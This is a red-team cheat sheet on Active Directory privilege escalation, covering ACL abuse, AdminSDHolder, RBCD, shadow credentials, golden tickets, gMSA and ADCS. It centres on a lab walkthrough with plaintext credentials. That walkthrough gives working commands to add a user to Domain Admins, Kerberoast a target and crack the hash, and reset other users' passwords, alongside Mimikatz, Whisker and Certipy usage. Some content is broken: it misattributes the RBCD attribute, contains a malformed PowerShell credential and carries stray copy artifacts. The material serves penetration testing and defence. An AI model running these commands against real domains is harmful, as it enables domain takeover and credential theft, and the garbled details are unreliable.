<details>
<summary> DACL/ACL-Based Escalation (GenericAll / WriteDACL / WriteProperty)</summary>
 <br> 
In Active Directory (AD), a DACL (Discretionary Access Control List) is a component of an object’s security descriptor. It specifies which users or groups are allowed (or denied) access to the object and what actions they are permitted to perform. It essentially controls who can do what to an object. Such as a user account, computer, group, or any other directory object.
If you (or a compromised account) have ACL rights like GenericAll, WriteDACL, or WriteProperty over another AD object (user, group, OU, computer), you can modify permissions or credentials to escalate privileges 
Generic ALL Right
In Active Directory, permissions and privileges define what actions an entity (user, group, or computer) can perform on another object. The “Generic ALL” privilege is one of the most powerful in AD because it grants complete control over the target object. This means that the user or group with this privilege can:

Modify any attribute of the object
Reset passwords
Add or remove members from groups
Delegate further control to other users
Delete the object altogether
Because of its extensive reach, an attacker who gains “Generic ALL” privileges on sensitive objects (like privileged groups or service accounts) can essentially gain domain dominance.

Exploiting “Generic ALL” Privilege
Here’s how an attacker can leverage the “Generic ALL” privilege to compromise Active Directory:

Identifying Targets with “Generic ALL” Privilege
The first step is to identify objects where the attacker has this privilege. This can be done using tools like BloodHound or PowerView, which map out Active Directory and show privilege relationships. Once identified, the attacker can choose their target based on the potential impact (e.g., a Domain Admin account).
Resetting Passwords
If the “Generic ALL” privilege is applied to a user account, the attacker can reset the account’s password. This is particularly devastating if the account is for a privileged user, such as a Domain Administrator. After resetting the password, the attacker can log in as that user and gain full control over the domain.
Modifying Group Membership
If the “Generic ALL” privilege is applied to a group, the attacker can add themselves to a high-privilege group, like Domain Admins or Enterprise Admins. This grants them the privileges of those groups, effectively giving them control over the entire domain.
Abusing Delegated Control
With the “Generic ALL” privilege, the attacker can delegate control of the target object to another user or group. This allows them to grant privileges to themselves or other malicious users without raising suspicion immediately.
Deleting or Modifying Objects
In extreme cases, an attacker with “Generic ALL” can delete critical objects, such as service accounts or privileged users, causing operational disruptions or creating avenues for further exploitation.
🔍 Detection

Use BloodHound to detect privileged edges (WriteDacl, GenericAll).

Run PowerView:

powershell

    Get-ObjectAcl -SamAccountName TargetUser -ResolveGUIDs
Filter for rights: GenericAll, WriteDacl, etc. 

⚙️ Exploitation
Use PowerView/Powermad:

powershell

    Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "LowPrivUser" -Rights All
Then add yourself to Domain Admins or reset passwords.
Exploitation Phase I – User Own Generic All Right for Group
Compromised User: Komal

Target Account: Domain Admin Group

Now that the lab is set up, let’s walk through how an attacker (acting as Komal) can abuse the Generic ALL privilege.

Assuming the Red Teamer knows the credential for Komal Users as a Standard Domain Users and would like to enumerate the other Domain users & Admin members with the help of “net-rpc” Samba command line Utility.

net rpc user -U ignite.local/komal%'Password@1' -S 192.168.1.8
net rpc group members "Domain Admins" -U ignite.local/komal%'Password@1' -S 192.168.1.8
After executing above command its has been concluded that the Administrator users is only the single member of the Admin group. Unfortunately, the tester is doesn’t know the credentials of administrator.



Bloodhound -Hunting for Weak Permission
Use BloodHound to Confirm Privileges: You can use BloodHound to verify that Komal has the Generic ALL right on the Domain Admins group.

bloodhound-python -u komal -p Password@1 -ns 192.168.1.8 -d ignite.local -c All
Generic ALL Active Directory Abuse

From the graphical representation of Bloodhound, the tester would like to identify the outbound object control for selected user where the first degree of object control value is equal to 1.



Thus it has shown the Komal User has Generic ALL privilege to Domain Admin group and provided steps for exploitation to be proceed.

Generic ALL Active Directory Abuse

Method for Exploitation – Account Manipulation (T1098)
1. Linux Net RPC – Samba
The tester can abuse this permission by Komal User into Domain Admin group and list the domain admin members to ensure that Komal Users becomes Domain Admin.

net rpc group addmem "Domain Admins" "komal" -U ignite.local/komal%'Password@1' -S 192.168.1.8


2. Linux Bloody AD
bloodyAD --host "192.168.1.8" -d "ignite.local" -u "komal" -p "Password@1" add groupMember "Domain Admins" "komal"


Thus, from the user property we can see Komal user has become a member of domain admin.

Generic ALL Active Directory Abuse

3. Windows Net command
net group "domain admins" komal /add /domain


Exploitation Phase II – User’s own generic Right for another user
To set up a lab environment where the user Nishant has Generic ALL rights over the user Vipin, you’ll need to follow several steps. This process involves configuring Active Directory (AD) permissions so that Nishant can manipulate attributes of the Vipin account.

Step 1: Create Two AD user accounts
net user vipin Password@1 /add /domain
net user nishant Password@1 /add /domain
                

Step 2: Assign Generic ALL Permissions
Open Active Directory Users and Computers.
Navigate to the Vipin user account.
Right-click on Vipin, select Properties.
                Generic ALL Active Directory Abuse

Go to the Security tab.
Click Advanced and then Add.
                

In the “Enter the object name to select” box, type Nishant and click Check Names.
After adding Nishant, set the permissions:
Check Generic All in the permissions list (you may need to select Full Control to encompass all rights).
                

Ensure Applies to is set to This object only.
                Generic ALL Active Directory Abuse

Bloodhound -Hunting for Weak Permissions
Hunting for First Degree objection Control for Nishant Users as we did in previous steps

bloodhound-python -u nishant -p Password@1 -ns 192.168.1.8 -d ignite.local -c All


From the graph, it can be observed that the Nishant user owns generic all privileges on Vipin user

Generic ALL Active Directory Abuse

Moreover, Bloodhound also helps the pentest to define the possible attack from the user account nishant, this user can perform domain attack such as keroasting and shadow credentials



Multiple Methods for Exploitation
1. T1558.003 – Kerberoasting
1.1  Linux Python Script – TargetedKerberoast
Compromised User: Nishant: Password@123

Target User: Vipin

Kerberoasting is an attack technique that targets service accounts in Active Directory environments, where an attacker with Generic ALL permissions on a user can exploit the ability to request service tickets (TGS). By requesting TGS for service accounts, the attacker can obtain encrypted tickets that include the service account’s password hash. Since these tickets can be extracted and then offline cracked, the attacker can potentially gain access to the service account’s credentials. The attack leverages the fact that service accounts typically have elevated privileges, allowing the attacker to escalate their own access within the network once the password is cracked. This exploitation is particularly effective in environments where weak or easily guessable passwords are used for service accounts.

Cloning the Targeted Kerberoast Tool
To perform this attack, first, clone the targetedKerberoast repository from GitHub using the following command:

git clone https://github.com/ShutdownRepo/targetedKerberoast.git
Generic ALL Active Directory Abuse

./targetedKerberoast.py --dc-ip '192.168.1.8' -v -d 'ignite.local' -u 'nishant' -p 'Password@1'
As we have seen during the lab setup, the vipin user was added as a domain user account, which does not have any associated SPN. The Python script has modified the attribute of vipin user to set the SPN name and then dump Krbtgs hash that can be brute-forced offline. Moreover, the script performs a clear track step by removing the SPN well live from the user attribute.

This type of attack is ideally best when the attacker is not willing to change the password for the target user <Vipin in our case>, even generic all privilege is enabled for the compromised user. Yes, this step is less noisy than changing the password of any user.



Further, with the help of John the Ripper and a dictionary such as Rock You can help the attacker to brute force the weak password.

Generic ALL Active Directory Abuse

1.2 Windows PowerShell Script-PowerView
To perform Kerberoasting using PowerView on a Windows machine, you can leverage PowerView’s ability to enumerate Active Directory service accounts that have Service Principal Names (SPNs). These SPNs can be requested to obtain service tickets (TGS), which can then be cracked offline to reveal the service account’s credentials. Here’s a brief overview of the steps:

Make sur that the target account has no SPN and then Set the SPN to obtain the KerbTGS hash
Get-DomainUser 'vipin' | Select serviceprincipalname
Set-DomainObject -Identity 'vipin' -Set @{serviceprincipalname='nonexistent/hackingarticles'}
$User = Get-DomainUser 'vipin'
$User | Get-DomainSPNTicket | f1


Cracking TGS hash using Rockyou.txt with the help of Hashcat Tool.

Generic ALL Active Directory Abuse

2.     T1110.001 – Change Password
2.1 Linux Net RPC – Samba
net rpc password vipin 'Password@987' -U ignite.local/nishant%'Password@1' -S 192.168.1.8


2.2 Linux Net RPC – BloodAD
bloodyAD --host "192.168.1.8" -d "ignite.local" -u "nishant" -p "Password@1" set password "vipin" "Password@9876"
Generic ALL Active Directory Abuse

2.3 Linux Net RPC –Rpcclient
rpcclient -U ignite.local/nishant 192.168.1.8
setuserinfo vipin 23 Ignite@987
Generic ALL Active Directory Abuse

2.4 Windows Net Utility
net user Vipin Password@1234 /domain


2.5 Windows PowerShell -Powerview
$SecPassword = ConvertTo-SecureString 'Password@987' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('ignite.localvipin', $SecPassword)
Generic ALL Active Directory Abuse

2.6 Windows PowerShell
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'vipin' -AccountPassword $NewPassword

🛡️ Mitigation

Audit ACLs on sensitive objects (adminCount=1).

Use BloodHound to regularly review privileged rights.

Limit ACEs granting WriteDACL or GenericAll.
</details>
<details>
<summary>AdminSDHolder Abuse</summary>
 <br>  
The AdminSDHolder object enforces consistent ACLs on protected groups (like Domain Admins). If you can alter its ACL, the change propagates via SDProp to all members 

🔍 Detection
Search for AdminSDHolder ACLs:

powershell

    Get-ADUser -LDAPFilter "(AdminCount=1)" ...
    Get-ACL "AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com"
⚙️ Exploitation

powershell

    Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,...' -PrincipalSamAccountName attacker -Rights All
You’ll gain long-term privileged membership.

🛡️ Mitigation

Restrict ACL modifications on AdminSDHolder.

Monitor event logs for changes (event IDs 4662, 4670).
</details>
<details>
<summary>Resource-Based Constrained Delegation (RBCD) Abuse</summary>
 <br> 

Control over a computer object plus delegation rights can allow you to impersonate users to services—escalating to SYSTEM or DC-level access via Kerberos ticket forging.

🔍 Detection
Use BloodHound to detect AllowedToDelegateTo paths. Query with:

powershell

    Get-ADComputer -Properties msDS-AllowedToDelegateTo
⚙️ Exploitation
Create a computer account (e.g. attacker$) and set delegation rights:

powershell

    Set-ADComputer target$ -Add @{msDS-AllowedToDelegateTo='attacker$'}
Then issue Kerberos tickets with Rubeus or Impacket.

🛡️ Mitigation

Limit delegation rights.

Audit msDS-AllowedToDelegateTo attributes.

Disable unconstrained delegation unless required.
</details>
<details>
<summary>Shadow Credentials</summary>
 <br> 

If you can write to the msDS-KeyCredentialLink attribute on an object, you can create a "shadow credential" (certificate) to authenticate as them via Kerberos PKINIT without needing passwords 
HADESS

🔍 Detection
Check write permissions on this attribute via BloodHound or PowerView:

powershell

    Get-ACL object | Select-Object rights
⚙️ Exploitation
Use Whisker.exe:

powershell

    Whisker.exe add /target:CompAccount$
Then obtain TGT via certificate-based authentication with Rubeus.

🛡️ Mitigation

Disable unnecessary write access to msDS-KeyCredentialLink.

Monitor certificate enrollment events.

Enforce Windows ≥2016 with Kerberos protections.
</details>
<details>
<summary>SID History Injection</summary>
 <br> 

If you can modify SIDHistory (or have KRBTGT hash), you can inject high-privilege SIDs into your account and forge golden tickets for domain admin access.

🔍 Detection
Check SIDHistory values via ADSI or BloodHound.

⚙️ Exploitation
Use Mimikatz:

powershell

    kerberos::golden /user:attacker /sid:<DA_SID> 
Forge TGT tickets to escalate.

🛡️ Mitigation

Monitor creation of unusual tickets or SIDHistory changes (Event ID 4720/4732).

Secure KRBTGT hash with frequent password resets.
</details>
<details>
<summary>Trust Exploitation / Foreign Security Principals Abuse</summary>
 <br>
 Trust Exploitation / Foreign Security Principals Abuse

In multi-domain or multi-forest environments, trust misconfigurations allow abused FSP entries from other realms to escalate via cross-domain ACLs.

🔍 Detection
BloodHound shows trust paths and unresolved SIDs.

⚙️ Exploitation
Add FSP SID from trusted domain into a privileged group using ACL editing.

🛡️ Mitigation

Enable SID filtering.

Validate cross-domain ACLs for resolved accounts only.
</details>
<details>
<summary>gMSA Password Disclosure</summary>
 <br>
 gMSA Password Disclosure

If you can read msDS-ManagedPassword, you can retrieve the machine account password of a Group Managed Service Account to impersonate it.

🔍 Detection
Check ACL on gMSA:

powershell

    Get-ADServiceAccount gmsa -Properties msDS-ManagedPassword
ConvertFrom-ADManagedPasswordBlob ...
⚙️ Exploitation
With ReadGMSAPassword rights, extract credentials via PowerShell (ConvertFrom-ADManagedPasswordBlob).

🛡️ Mitigation

Restrict read ACLs for these attributes.

Monitor gMSA password retrieval events.
</details>
<details>
<summary>Golden Ticket Forgery (KRBTGT compromise)</summary>
 <br>
If you can extract KRBTGT NTLM hash (e.g. via DCSync), you can issue valid TGTs for any domain user—including Domain Admins—without contacting KDC.

🔍 Detection
Monitor long-lifetime TGT events (Event ID 4768) or hash extraction attempts.

⚙️ Exploitation
Use Mimikatz:

powershell

    kerberos::golden /user:Administrator /krbtgt:<hash> /domain:domain.com
Inject ticket with /ptt.

🛡️ Mitigation

Periodically reset KRBTGT twice.

Monitor DCSync and TGT creation anomalies.
</details>
<details>
<summary> ADCS Misconfiguration / ESC Attacks</summary>
 <br>

Abusing Certificate Templates or CA permissions can allow low-privilege users to enroll certs for high-risk purposes (e.g. escrow, domain authentication), leading to full domain compromise 

🔍 Detection

Use certipy, bloodhound or certify to enumerate templates and CA ACLs.

Check for templates that allow enrollment to Authenticated Users.

⚙️ Exploitation
Certipy or PowerView:

powershell
Copy
Edit
Certipy find
Certipy enroll attacker -template vulnerableTemplate
Use resulting certificate to authenticate via PKINIT.

🛡️ Mitigation

Secure template ACLs (use principle of least privilege).

Require CA manager approval for templates.

Monitor certificate issuance logs.

